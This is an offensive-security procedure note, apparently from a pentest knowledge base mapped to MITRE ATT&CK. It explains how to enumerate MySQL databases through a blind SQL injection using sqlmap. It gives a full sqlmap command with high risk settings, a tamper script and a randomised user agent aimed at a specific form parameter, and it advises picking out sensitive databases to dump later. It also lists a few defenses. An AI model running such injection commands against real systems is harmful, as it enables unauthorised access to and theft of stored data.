---
tags:
  - sqli
  - enumeration
  - database-discovery
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-enumerate-databases]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:25.858Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 958f1b5c-770b-45ce-a2ef-c030d6ba15ec
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Enumerate-Databases-via-SQL-Injection

## Summary

This procedure exploits a confirmed blind SQL injection to enumerate all accessible databases on the MySQL server, revealing sensitive ones like 'testusers' for potential data extraction.

## Description

With the injection point validated, sqlmap uses blind techniques to query database names via conditional logic or delays. This targets the information_schema database implicitly, listing schemas in a PHP/MySQL web app. The attack demonstrates impact by exposing database structure, leading to further risks like table dumping or credential harvesting.

## Requirements

1. Confirmed SQL injection in 'staff_student' parameter
2. Sqlmap with MySQL support
3. Stable connection to avoid timeouts in time-based queries

## Defense

Defensive measures and detection strategies:

- Restrict database user privileges to minimal schema access
- Enable MySQL query auditing for schema enumeration attempts
- Use connection pooling and IP whitelisting to limit external query access

## Objectives

1. List all databases on the MySQL instance
2. Identify sensitive databases (e.g., 'testusers')
3. Assess scope for data collection

## Instructions

### Step 1: Run Sqlmap with Database Enumeration Flag

**Context**: Append --dbs to the sqlmap command to leverage the injection for extracting database names using blind methods.

**Command** ([[commands/sqlmap-enumerate-databases]]):
```bash
python3 sqlmap.py -l=5 --risk=3 --tamper=space2comment --random-agent -u "https://target.com/olc/xxxcomments/comment_post.php" --data="staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments" -p staff_student --dbms=mysql --dbs
```

> Sqlmap will output a list of databases (e.g., [13]: information_schema, mysql, testusers, etc.), using boolean or time-based oracles to infer names character by character.

### Step 2: Review and Prioritize Databases

**Context**: Analyze the enumerated list to identify high-value targets for subsequent steps like --tables or --dump.

**Command**: No new command; manual review.

> Flag databases like 'testusers' as sensitive; note total count and any custom app databases.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-enumerate-databases]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- sqli
- enumeration
- database-discovery
